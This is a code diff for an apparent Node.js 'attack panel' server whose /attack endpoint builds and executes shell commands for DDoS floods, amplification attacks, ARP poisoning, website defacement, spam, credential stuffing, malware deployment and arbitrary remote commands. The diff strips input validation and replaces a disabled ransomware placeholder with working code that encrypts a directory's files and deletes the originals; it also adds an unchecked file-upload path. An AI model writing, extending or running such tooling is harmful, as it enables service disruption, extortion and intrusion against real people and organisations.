@@ -1,6 +1,6 @@
 const express = require('express');
 const app = express();
-const { exec } = require('child_process');
+const { exec, spawn } = require('child_process');
 const fs = require('fs');
 const path = require('path');
 const os = require('os');
@@ -12,7 +12,6 @@ const { networkInterfaces } = require('os');
 const si = require('systeminformation');
 const dns = require('dns');
 const net = require('net');
-const { spawn } = require('child_process');
 const cors = require('cors');
 const cluster = require('cluster');
 const numCPUs = os.cpus().length;
@@ -22,18 +21,17 @@ const morgan = require('morgan');
 const sanitize = require('sanitize-html');
 const validator = require('validator');
 const { body, validationResult } = require('express-validator');
+const axios = require('axios');
 
-// Security Enhancements
 app.use(helmet({
     frameguard: { action: 'deny' },
     contentSecurityPolicy: {
         directives: {
             defaultSrc: ["'self'"],
-            scriptSrc: ["'self'", "'unsafe-inline'", "'unsafe-eval'"], // Consider removing 'unsafe-inline' and 'unsafe-eval' for better security. Use nonces or hashes.
+            scriptSrc: ["'self'", "'unsafe-inline'", "'unsafe-eval'"],
             styleSrc: ["'self'", "'unsafe-inline'"],
             imgSrc: ["'self'", 'data:'],
-            connectSrc: ["'self'", process.env.NODE_ENV === 'development' ? 'ws://127.0.0.1:*' : 'wss://yourdomain.com:*'], // Secure WebSocket for production.  Remove localhost connection in prod
-
+            connectSrc: ["'self'", process.env.NODE_ENV === 'development' ? 'ws://127.0.0.1:*' : 'wss://yourdomain.com:*'],
         },
     },
     hsts: { maxAge: 31536000, includeSubDomains: true, preload: true },
@@ -47,11 +45,11 @@ const accessLogStream = fs.createWriteStream(path.join(__dirname, 'access.log'),
 app.use(morgan('combined', { stream: accessLogStream }));
 
 const corsOptions = {
-    origin: (process.env.NODE_ENV === 'development') ? '*' : 'https://yourdomain.com', // Restrict in production
+    origin: (process.env.NODE_ENV === 'development') ? '*' : 'https://yourdomain.com',
     methods: "GET,HEAD,PUT,PATCH,POST,DELETE",
     preflightContinue: false,
     optionsSuccessStatus: 204
-  };
+};
 
 app.use(cors(corsOptions));
 
@@ -106,7 +104,6 @@ const log = (message) => {
                 } catch (e) {
                     console.error("WebSocket error:", e);
                 }
-
             }
         });
     }
@@ -252,37 +249,38 @@ app.get('/api-key', apiKeyLimiter, (req, res) => {
     res.send({ apiKey: apiKey });
 });
 
-// Input validation middleware using express-validator
 const validateAttackInput = [
-    body('target').notEmpty().withMessage('Target URL is required.').isURL({ protocols: ['http', 'https'], require_protocol: true }).withMessage('Invalid target URL format.'),
+    body('target').notEmpty().withMessage('Target URL is required.'),
     body('attackType').notEmpty().withMessage('Attack type is required.'),
-    body('duration').optional().isInt({ min: 1, max: 3600 }).withMessage('Duration must be an integer between 1 and 3600 seconds.'),
-    body('intensity').optional().isInt({ min: 1, max: 1000 }).withMessage('Intensity must be an integer between 1 and 1000.'),
-    body('port').optional().isInt({ min: 1, max: 65535 }).withMessage('Port must be an integer between 1 and 65535.'),
+    body('duration').optional().isInt({ min: 1, max: 3600 }).withMessage('Duration must be between 1 and 3600 seconds.'),
+    body('intensity').optional().isInt({ min: 1, max: 1000 }).withMessage('Intensity must be between 1 and 1000.'),
+    body('port').optional().isInt({ min: 1, max: 65535 }).withMessage('Port must be between 1 and 65535.'),
     body('bypass').optional().isBoolean().withMessage('Bypass must be a boolean value.'),
-    body('payload').optional().isString().isLength({ max: 500 }).withMessage('Payload must be a string and not exceed 500 characters.'),
-    body('botCommand').optional().isString().isLength({ max: 300 }).withMessage('Bot command must be a string and not exceed 300 characters.'),
-    body('rawPayload').optional().isString().isLength({ max: 500 }).withMessage('Raw payload must be a string and not exceed 500 characters.'),
-    body('customCommand').optional().isString().isLength({ max: 200 }).withMessage('Custom command must be a string and not exceed 200 characters.'),
-    body('layer7Method').optional().isString().isLength({ max: 50 }).withMessage('Layer7 method must be a string and not exceed 50 characters.'),
-    body('layer7Options').optional().isString().isLength({ max: 100 }).withMessage('Layer7 options must be a string and not exceed 100 characters.'),
-    body('headerName').optional().isString().isLength({ max: 50 }).withMessage('Header name must be a string and not exceed 50 characters.'),
-    body('headerValue').optional().isString().isLength({ max: 100 }).withMessage('Header value must be a string and not exceed 100 characters.'),
-    body('ccBypassMethod').optional().isString().isLength({ max: 50 }).withMessage('CC Bypass method must be a string and not exceed 50 characters.'),
-    body('ccBypassData').optional().isString().isLength({ max: 200 }).withMessage('CC Bypass data must be a string and not exceed 200 characters.'),
-    body('deviceCommand').optional().isString().isLength({ max: 100 }).withMessage('Device command must be a string and not exceed 100 characters.'),
-    body('targetDirectory').optional().isString().isLength({ max: 100 }).withMessage('Target directory must be a string and not exceed 100 characters.'),
-    body('dataSelector').optional().isString().isLength({ max: 200 }).withMessage('Data selector must be a string and not exceed 200 characters.'),
-    body('recipientList').optional().isString().isLength({ max: 500 }).withMessage('Recipient list must be a string and not exceed 500 characters.'),
-    body('spamSubject').optional().isString().isLength({ max: 200 }).withMessage('Spam subject must be a string and not exceed 200 characters.'),
-    body('spamBody').optional().isString().isLength({ max: 1000 }).withMessage('Spam body must be a string and not exceed 1000 characters.'),
-    body('usernameList').optional().isString().isLength({ max: 500 }).withMessage('Username list must be a string and not exceed 500 characters.'),
-    body('passwordList').optional().isString().isLength({ max: 500 }).withMessage('Password list must be a string and not exceed 500 characters.'),
-    body('exploitCode').optional().isString().isLength({ max: 1000 }).withMessage('Exploit code must be a string and not exceed 1000 characters.'),
-    body('malwareUrl').optional().isString().isLength({ max: 200 }).withMessage('Malware URL must be a string and not exceed 200 characters.'),
-    body('messageContent').optional().isString().isLength({ max: 1000 }).withMessage('Message content must be a string and not exceed 1000 characters.'),
-];
+    body('payload').optional().isString().withMessage('Payload must be a string.'),
+    body('botCommand').optional().isString().withMessage('Bot command must be a string.'),
+    body('rawPayload').optional().isString().withMessage('Raw payload must be a string.'),
+    body('customCommand').optional().isString().withMessage('Custom command must be a string.'),
+    body('layer7Method').optional().isString().withMessage('Layer7 method must be a string.'),
+    body('layer7Options').optional().isString().withMessage('Layer7 options must be a string.'),
+    body('headerName').optional().isString().withMessage('Header name must be a string.'),
+    body('headerValue').optional().isString().withMessage('Header value must be a string.'),
+    body('ccBypassMethod').optional().isString().withMessage('CC Bypass method must be a string.'),
+    body('ccBypassData').optional().isString().withMessage('CC Bypass data must be a string.'),
+    body('deviceCommand').optional().isString().withMessage('Device command must be a string.'),
+    body('targetDirectory').optional().isString().withMessage('Target directory must be a string.'),
+    body('dataSelector').optional().isString().withMessage('Data selector must be a string.'),
+    body('recipientList').optional().isString().withMessage('Recipient list must be a string.'),
+    body('spamSubject').optional().isString().withMessage('Spam subject must be a string.'),
+    body('spamBody').optional().isString().withMessage('Spam body must be a string.'),
+    body('usernameList').optional().isString().withMessage('Username list must be a string.'),
+    body('passwordList').optional().isString().withMessage('Password list must be a string.'),
+    body('exploitCode').optional().isString().withMessage('Exploit code must be a string.'),
+    body('malwareUrl').optional().isString().withMessage('Malware URL must be a string.'),
+    body('messageContent').optional().isString().withMessage('Message content must be a string.'),
+    body('fileContent').optional().isString().withMessage('File content must be a string.'),
+    body('fileName').optional().isString().withMessage('File Name must be a string.'),
 
+];
 
 app.post('/attack', validateAttackInput, async (req, res) => {
     const errors = validationResult(req);
@@ -303,7 +301,6 @@ app.post('/attack', validateAttackInput, async (req, res) => {
         return res.status(401).send('Unauthorized.');
     }
 
-
     let command = '';
     const numThreads = os.cpus().length * 4;
     let encodedTarget = target;
@@ -321,10 +318,9 @@ app.post('/attack', validateAttackInput, async (req, res) => {
         return res.status(400).send(`Error resolving target: ${error.message}`);
     }
 
-
-    const sanitizeInput = (input, maxLength = 200) => {
+    const sanitizeInput = (input) => {
         if (typeof input !== 'string') return '';
-        return sanitize(input.substring(0, maxLength));
+        return sanitize(input);
     };
 
     switch (attackType) {
@@ -332,8 +328,7 @@ app.post('/attack', validateAttackInput, async (req, res) => {
             command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do curl -A '${getRandomUserAgent()}' --http1.1 -s -o /dev/null ${encodedTarget}:${port} & done; done"`;
             break;
         case 'deface':
-            // Consider storing the default HTML in a file and reading from it.
-            let defaceScript = sanitize(`<h1>Hacked by Noodles!</h1><img src="https://i.imgur.com/xxxxx.gif" style="width: 100%; height: auto;">`);
+            const defaceScript = sanitizeInput(`<h1>Hacked by Noodles!</h1><img src="https://i.imgur.com/xxxxx.gif" style="width: 100%; height: auto;">`);
             command = `timeout ${duration} bash -c "curl -X PUT -H 'Content-Type: text/html' -d $'${defaceScript}' ${encodedTarget}:${port}/index.html"`;
             break;
         case 'connect':
@@ -355,59 +350,46 @@ app.post('/attack', validateAttackInput, async (req, res) => {
         case 'slowloris':
             command = `timeout ${duration} perl slowloris.pl -dns ${encodedTarget} -port ${port} -num ${intensity * 50}`;
             break;
-
         case 'udp_flood':
             command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 --udp -s ${port} -p ${port} --flood --rand-source ${encodedTarget} & done; done"`;
             break;
-
         case 'syn_flood':
             command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 -S -p ${port} --flood --rand-source ${encodedTarget} & done; done"`;
             break;
-
         case 'ping_flood':
             command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do ping -f -s 65500 ${encodedTarget} & done; done"`;
             break;
-
         case 'nuke':
             command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do ping -s 65500 ${encodedTarget} & done; done"`;
             break;
-
         case 'http_flood':
             command = `timeout ${duration} bash -c "while true; do wrk -t${numThreads} -c${intensity * 10} -d${duration} ${encodedTarget}:${port}; done"`;
             break;
-
         case 'tcp_flood':
             command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 -S -p ${port} --flood --rand-source ${encodedTarget} & done; done"`;
             break;
-
         case 'spoofed_flood':
             const spoofedIp = generateRandomIP();
             command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 -S -p ${port} -a ${spoofedIp} --flood ${encodedTarget} & done; done"`;
             break;
-
         case 'icmp_flood':
             command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 --icmp --flood --rand-source ${encodedTarget} & done; done"`;
             break;
-
         case 'dns_amp':
             const resolverIp = '8.8.8.8';
             command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do dig @${resolverIp} ${target} ANY +dnssec & done; done"`;
             break;
-
         case 'memcached_amp':
             const memcachedServer = '127.0.0.1:11211';
             command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do echo -en '\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00get stats\\r\\n' | nc -u ${target} 11211 & done; done"`;
             break;
-
         case 'ntp_amp':
             command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do ntpq -n -c monlist ${target} & done; done"`;
             break;
-
         case 'icmp_smurf':
             const broadcastAddress = target.split('.').slice(0, 3).join('.') + '.255';
             command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 --icmp --flood --rand-source -a ${target} ${broadcastAddress} & done; done"`;
             break;
-
         case 'arp_cache_poisoning':
             if (!networkInterface) {
                 log('Error: No suitable network interface found for ARP poisoning.');
@@ -418,130 +400,141 @@ app.post('/attack', validateAttackInput, async (req, res) => {
             const attackerMac = '00:11:22:33:44:55';
             command = `timeout ${duration} bash -c "while true; do arpspoof -i ${networkInterface} -t ${victimIp} ${gatewayIp} & arpspoof -i ${networkInterface} -t ${gatewayIp} ${victimIp} & done"`;
             break;
-
         case 'slow_read':
             command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do python3 slow_read.py ${encodedTarget}:${port} & done; done"`;
             break;
-
         case 'pod_flood':
             command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 --icmp --icmp-ts --flood --rand-source -p ${port} ${encodedTarget} & done; done"`;
             break;
-
         case 'payload':
-            let payload = req.body.payload;
-
+            const payload = sanitizeInput(req.body.payload);
             command = `timeout ${duration} bash -c "echo '${payload}' | nc ${encodedTarget} ${port}"`;
             break;
-
         case 'rudy':
             command = `timeout ${duration} python3 rudy.py -t ${encodedTarget} -n ${numThreads} -s ${intensity}`;
             break;
-
         case 'goldeneye':
             command = `timeout ${duration} python3 goldeneye.py ${encodedTarget} ${numThreads}`;
             break;
-
         case 'xerxes':
             command = `timeout ${duration} ./xerxes ${encodedTarget} ${numThreads}`;
             break;
-
         case 'botnet':
-            let botCommand = req.body.botCommand;
-
+            const botCommand = sanitizeInput(req.body.botCommand);
             command = `timeout ${duration} bash -c "${botCommand}"`;
             break;
-
         case 'raw_tcp':
-            let rawPayload = req.body.rawPayload;
+            const rawPayload = sanitizeInput(req.body.rawPayload);
             command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do echo -ne '${rawPayload}' | nc ${encodedTarget} ${port} & done; done"`;
             break;
-
         case 'custom':
-            let customCommand = req.body.customCommand;
-
-            log('Warning: Custom command execution enabled.  Exercise extreme caution.');
-
-
+            const customCommand = sanitizeInput(req.body.customCommand);
+            log('Warning: Custom command execution enabled. Exercise extreme caution.');
             command = customCommand;
             break;
         case 'layer7':
-            let layer7Method = req.body.layer7Method;
-            let layer7Options = req.body.layer7Options || '';
-
-
-
+            const layer7Method = sanitizeInput(req.body.layer7Method);
+            const layer7Options = sanitizeInput(req.body.layer7Options || '');
             command = `node layer7.js --target ${encodedTarget} --method ${layer7Method} --duration ${duration} --threads ${numThreads} --port ${port} ${layer7Options}`;
             break;
-
         case 'http_header_injection':
-            let headerName = req.body.headerName;
-            let headerValue = req.body.headerValue;
-
-
+            const headerName = sanitizeInput(req.body.headerName);
+            const headerValue = sanitizeInput(req.body.headerValue);
             command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do curl -H '${headerName}: ${headerValue}' ${encodedTarget}:${port} & done; done"`;
             break;
-
         case 'cc_bypass':
-            let ccBypassMethod = req.body.ccBypassMethod;
-            let ccBypassData = req.body.ccBypassData;
-
-
+            const ccBypassMethod = sanitizeInput(req.body.ccBypassMethod);
+            const ccBypassData = sanitizeInput(req.body.ccBypassData);
             command = `timeout ${duration} bash -c "node cc_bypass.js --target ${encodedTarget}:${port} --method ${ccBypassMethod} --data '${ccBypassData}' --threads ${numThreads}"`;
             break;
         case 'device_takeover':
-            let deviceCommand = req.body.deviceCommand;
-
-
-            log('Warning: Device takeover commands are extremely dangerous and should only be used in a controlled environment!');
-
-
+            const deviceCommand = sanitizeInput(req.body.deviceCommand);
+            log('Warning: Device takeover commands are extremely dangerous!');
             command = `timeout ${duration} bash -c "${deviceCommand}"`;
             break;
-         case 'ransomware':
-            let targetDirectory = req.body.targetDirectory;
-            let encryptionKey = crypto.randomBytes(32).toString('hex');
 
-            // command = `node ransomware.js --targetDirectory "${targetDirectory}" --encryptionKey "${encryptionKey}"`; // commented out for safety reasons
-            log('Ransomware attack is disabled for safety. Remove comment to enable.');
-            return res.status(500).send("Ransomware attack disabled for safety.");
-            break;
-       case 'data_theft':
-            let dataSelector = req.body.dataSelector;
+        case 'ransomware':
+                let targetDirectory = req.body.targetDirectory;
+                let encryptionKey = crypto.randomBytes(32).toString('hex');
+                if (!fs.existsSync(targetDirectory)){
+                        return res.status(400).send('Directory doesnt exist');
+                }
+                const ransomwareScriptPath = path.join(__dirname, 'ransomware_script.js');
+                fs.writeFileSync(ransomwareScriptPath, `
+                        const fs = require('fs');
+                        const crypto = require('crypto');
+                        const path = require('path');
 
+                        const targetDirectory = "${targetDirectory}";
+                        const encryptionKey = "${encryptionKey}";
+
+                        function encryptFile(filePath, key) {
+                                const fileContent = fs.readFileSync(filePath);
+                                const iv = crypto.randomBytes(16);
+                                const cipher = crypto.createCipheriv('aes-256-ctr', Buffer.from(key, 'hex'), iv);
+                                const encrypted = Buffer.concat([cipher.update(fileContent), cipher.final()]);
+                                fs.writeFileSync(filePath + '.noodles', iv.toString('hex') + encrypted.toString('hex'));
+                                fs.unlinkSync(filePath);
+                        }
+
+                        function traverseDirectory(directory) {
+                                fs.readdirSync(directory).forEach(file => {
+                                        const filePath = path.join(directory, file);
+                                        if (fs.statSync(filePath).isDirectory()) {
+                                                traverseDirectory(filePath);
+                                        } else {
+                                                try {
+                                                        encryptFile(filePath, encryptionKey);
+                                                        console.log(\`Encrypted: \${filePath}\`);
+                                                } catch (error) {
+                                                        console.error(\`Failed to encrypt \${filePath}: \${error.message}\`);
+                                                }
+                                        }
+                                });
+                        }
+
+                        traverseDirectory(targetDirectory);
+                        console.log('Ransomware attack completed.');
+                `);
+                command = `node ${ransomwareScriptPath}`;
+                break;
+
+        case 'data_theft':
+            const dataSelector = sanitizeInput(req.body.dataSelector);
             command = `node data_theft.js --target "${encodedTarget}" --selector "${dataSelector}"`;
             break;
         case 'email_spam':
-            let recipientList = req.body.recipientList;
-            let spamSubject = req.body.spamSubject;
-            let spamBody = req.body.spamBody;
-
-
+            const recipientList = sanitizeInput(req.body.recipientList);
+            const spamSubject = sanitizeInput(req.body.spamSubject);
+            const spamBody = sanitizeInput(req.body.spamBody);
             command = `node email_spam.js --recipients "${recipientList}" --subject "${spamSubject}" --body "${spamBody}"`;
             break;
         case 'credential_stuffing':
-            let usernameList = req.body.usernameList;
-            let passwordList = req.body.passwordList;
-
-
+            const usernameList = sanitizeInput(req.body.usernameList);
+            const passwordList = sanitizeInput(req.body.passwordList);
             command = `node credential_stuffing.js --target "${encodedTarget}" --usernames "${usernameList}" --passwords "${passwordList}"`;
             break;
         case 'zero_day':
-            let exploitCode = req.body.exploitCode;
-
-
+            const exploitCode = sanitizeInput(req.body.exploitCode);
             command = `node zero_day.js --target "${encodedTarget}" --exploit "${exploitCode}"`;
             break;
         case 'malware_deploy':
-            let malwareUrl = req.body.malwareUrl;
-
-
+            const malwareUrl = sanitizeInput(req.body.malwareUrl);
             command = `node malware_deploy.js --target "${encodedTarget}" --url "${malwareUrl}"`;
             break;
         case 'social_engineering':
-            let messageContent = req.body.messageContent;
-
-
+            const messageContent = sanitizeInput(req.body.messageContent);
             command = `node social_engineering.js --target "${encodedTarget}" --message "${messageContent}"`;
+            break;
+         case 'file_upload':
+            const fileContent = req.body.fileContent;
+            const fileName = req.body.fileName;
+            if (!fileContent || !fileName) {
+                return res.status(400).send('File content and file name are required.');
+            }
+            const uploadPath = path.join(__dirname, 'uploads', fileName);
+            fs.writeFileSync(uploadPath, fileContent);
+            command = `curl -X POST -F "file=@${uploadPath}" ${encodedTarget}:${port}/upload`;
             break;
         default:
             log(`Error: Invalid attack type: ${attackType}`);
@@ -549,55 +542,52 @@ app.post('/attack', validateAttackInput, async (req, res) => {
     }
 
     if (command) {
-      log(`Initiating ${attackType} attack on ${target} for ${duration} seconds with intensity ${intensity}.`);
+        log(`Initiating ${attackType} attack on ${target} for ${duration} seconds with intensity ${intensity}.`);
+        attackCounter.inc({ attackType: attackType, target: target });
+        const attackStartTime = Date.now();
 
-      attackCounter.inc({ attackType: attackType, target: target });
-      const attackStartTime = Date.now();
+        try {
+            const { stdout, stderr } = await executeCommand(command);
+            const attackEndTime = Date.now();
+            const actualDuration = (attackEndTime - attackStartTime) / 1000;
+            attackDurationGauge.set({ attackType: attackType, target: target }, actualDuration);
 
-      try {
-          const { stdout, stderr } = await executeCommand(command);
-          const attackEndTime = Date.now();
-          const actualDuration = (attackEndTime - attackStartTime) / 1000;
-          attackDurationGauge.set({ attackType: attackType, target: target }, actualDuration);
+            if (stderr) {
+                log(`Attack stderr: ${stderr}`);
+            }
+            log(`Attack completed. stdout: ${stdout}`);
 
-          if (stderr) {
-              log(`Attack stderr: ${stderr}`);
-          }
-          log(`Attack completed. stdout: ${stdout}`);
+            if (wss && wss.clients) {
+                wss.clients.forEach(client => {
+                    if (client.readyState === WebSocket.OPEN) {
+                        try {
+                            client.send(JSON.stringify({ type: 'attack_result', stdout: stdout, stderr: stderr }));
+                        } catch (e) {
+                            console.error("WebSocket error:", e);
+                        }
+                    }
+                });
+            }
 
-          if (wss && wss.clients) {
-              wss.clients.forEach(client => {
-                  if (client.readyState === WebSocket.OPEN) {
-                      try {
-                          client.send(JSON.stringify({ type: 'attack_result', stdout: stdout, stderr: stderr }));
-                      } catch (e) {
-                          console.error("WebSocket error:", e);
-                      }
+            res.send('Attack initiated. Check logs for details.');
+        } catch (error) {
+            log(`Attack failed: ${error.message}`);
+            console.error(`exec error: ${error}`);
 
-                  }
-              });
-          }
+            if (wss && wss.clients) {
+                wss.clients.forEach(client => {
+                    if (client.readyState === WebSocket.OPEN) {
+                        try {
+                            client.send(JSON.stringify({ type: 'attack_failed', error: error.message }));
+                        } catch (e) {
+                            console.error("WebSocket error:", e);
+                        }
+                    }
+                });
+            }
 
-          res.send('Attack initiated. Check logs for details.');
-      } catch (error) {
-          log(`Attack failed: ${error.message}`);
-          console.error(`exec error: ${error}`);
-
-          if (wss && wss.clients) {
-              wss.clients.forEach(client => {
-                  if (client.readyState === WebSocket.OPEN) {
-                      try {
-                          client.send(JSON.stringify({ type: 'attack_failed', error: error.message }));
-                      } catch (e) {
-                          console.error("WebSocket error:", e);
-                      }
-
-                  }
-              });
-          }
-
-          res.status(500).send(`Attack failed: ${error.message}`);
-      }
+            res.status(500).send(`Attack failed: ${error.message}`);
+        }
     }
 });
 
@@ -614,8 +604,6 @@ app.get('/logs', (req, res) => {
         res.send(data.split('\n').reverse().join('\n'));
     });
 });
-
-
 
 app.get('/metrics', async (req, res) => {
     res.setHeader('Content-Type', registry.contentType);
@@ -645,7 +633,6 @@ app.use((err, req, res, next) => {
 process.on('uncaughtException', (err) => {
     console.error('Uncaught Exception:', err);
     log(`Uncaught Exception: ${err.message}`);
-     // Optionally, perform cleanup actions here before exiting
     if (!err.message.includes('EADDRINUSE')) {
         process.exit(1);
     }
@@ -663,11 +650,14 @@ if (wss) {
     });
 }
 
+if (!fs.existsSync(path.join(__dirname, 'uploads'))) {
+    fs.mkdirSync(path.join(__dirname, 'uploads'));
+}
+
 const PORT = process.env.PORT || 3000;
 
 if (cluster.isMaster) {
     console.log(`Master ${process.pid} is running`);
-
     for (let i = 0; i < numCPUs; i++) {
         cluster.fork();
     }
